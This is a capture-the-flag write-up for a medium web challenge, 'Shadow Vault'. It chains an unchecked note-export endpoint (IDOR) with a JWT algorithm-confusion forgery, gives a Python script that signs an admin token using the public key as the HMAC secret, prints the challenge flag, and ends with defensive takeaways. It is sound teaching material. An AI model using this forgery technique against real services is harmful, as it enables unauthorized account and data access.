---
title: Shadow Vault
template: writeup.html
difficulty: Medium
category: Cylab
tags: [Web, IDOR, JWT]
points: 300
solve_time: 1.5 hr
author: Siddharth Mathur
date: 2026-04-02
description: Chaining a broken object-level authorization bug with a forged JWT role claim to reach an admin-only vault.
---

## Challenge Overview

`Shadow Vault` is a small note-taking web app with user accounts, private
notes, and an admin panel that supposedly requires elevated privileges.
The goal is to read the contents of `note#1`, owned by the `admin` user.

## Recon

Registering a normal account and inspecting requests in the browser
devtools shows notes are fetched by numeric ID:

```http
GET /api/notes/42 HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

Requesting a note ID that doesn't belong to the current user returns a
`403`, which initially suggests proper authorization checks are in place.

!!! note "First impression vs reality"
    A `403` on other users' notes looks correct, but the check turned out
    to be enforced only on the **read** endpoint, not on a secondary
    **export** endpoint discovered by walking the app's JS bundle.

## Finding the IDOR

Searching the minified frontend bundle for `/api/` reveals an
undocumented export route:

```js
axios.get(`/api/notes/${id}/export?format=json`)
```

Testing this route against another user's note ID returns the full note
content with no ownership check at all — a classic **Insecure Direct
Object Reference (IDOR)**.

```console
$ curl -s -H "Authorization: Bearer $TOKEN" \
    https://vault.cylab/api/notes/1/export?format=json
{"error":"forbidden: admin resource"}
```

Progress, but not quite there — `note#1` is additionally gated by a role
check on the server, separate from the ownership check the export route
was missing.

## Escalating via JWT

Decoding the JWT shows a standard `role` claim:

```json
{
  "sub": "u_1042",
  "role": "user",
  "iat": 1743600000,
  "exp": 1743603600
}
```

!!! warning "Signature algorithm confusion"
    The server accepts both `HS256` and `RS256` tokens on the same
    endpoint. Because the RS256 **public key** is exposed at
    `/.well-known/jwks.json`, it's possible to re-sign a forged token
    using `HS256` with the public key as the HMAC secret — the classic
    `alg` confusion attack.

```python title="forge_jwt.py"
import jwt
import requests

pubkey = requests.get("https://vault.cylab/.well-known/jwks.json").json()
pem = jwk_to_pem(pubkey["keys"][0])

forged = jwt.encode(
    {"sub": "u_1042", "role": "admin", "exp": 9999999999},
    pem,
    algorithm="HS256",
)
print(forged)
```

<details class="ctf-spoiler">
  <summary>Hint — why does this work?</summary>
  <div class="ctf-spoiler__body">
    Libraries that don't pin the expected algorithm will happily verify
    an <code>HS256</code> token using whatever key is provided — including
    a key that was only ever meant to be a public <em>verification</em>
    key for RS256.
  </div>
</details>

## Putting It Together

```console
$ python3 forge_jwt.py > token.txt
$ curl -s -H "Authorization: Bearer $(cat token.txt)" \
    https://vault.cylab/api/notes/1/export?format=json
{"id":1,"owner":"admin","content":"CyLab{alg_confusion_meets_idor}"}
```

## Flag

```
CyLab{alg_confusion_meets_idor}
```

## Takeaways

- Authorization checks must be enforced consistently across **every**
  endpoint that exposes a resource, not just the "primary" one.
- Never allow a single verification endpoint to accept multiple JWT
  algorithms without explicitly pinning the expected one.
- Public keys are public for a reason — but only for the operation they
  were meant for (signature verification), never as a symmetric secret.
